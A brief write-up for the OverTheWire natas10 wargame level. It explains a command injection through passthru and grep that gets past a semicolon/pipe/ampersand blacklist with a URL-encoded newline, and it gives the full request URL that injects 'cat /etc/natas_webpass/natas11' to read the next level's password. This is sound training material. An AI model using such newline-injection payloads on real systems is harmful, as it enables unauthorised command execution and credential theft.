# natas10 — Quick tip: `%0A` newline bypass (short)

**Summary**  
A command-injection lab: user input is passed into `passthru("grep -i $key dictionary.txt")`. The app blacklists `; | &` but misses newline injection — `%0A` (URL-encoded `\n`) can split lines and run another command.

---

## http://natas10.natas.labs.overthewire.org/?needle=%0Acat%20%2Fetc%2Fnatas_webpass%2Fnatas11%0A&submit=Search

